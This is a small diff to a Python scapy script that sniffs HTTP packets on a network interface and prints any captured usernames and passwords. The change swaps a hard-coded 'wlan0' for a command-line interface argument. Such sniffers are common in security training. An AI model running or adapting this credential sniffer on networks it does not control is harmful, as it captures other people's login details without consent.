@@ -2,11 +2,11 @@ import argparse
 import scapy.all as scapy
 from scapy.layers import http
 
-#def get_interface():
-    #parse = argparse.ArgumentParser()
-    #parse.add_argument("-i", "--interface", dest="interface", help="Enter interface")
-    #options = parse.parse_args()
-    #return options
+def get_interface():
+    parse = argparse.ArgumentParser()
+    parse.add_argument("-i", "--interface", dest="interface", help="Enter interface")
+    options = parse.parse_args()
+    return options
 
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_packet)
@@ -30,5 +30,5 @@ def process_packet(packet):
         if login:
             print("\n\n USERNAME and PASSWORD INFO >> " + login + "\n\n")
 
-#interface = get_interface()
-sniff("wlan0")
+options = get_interface()
+sniff(options.interface)
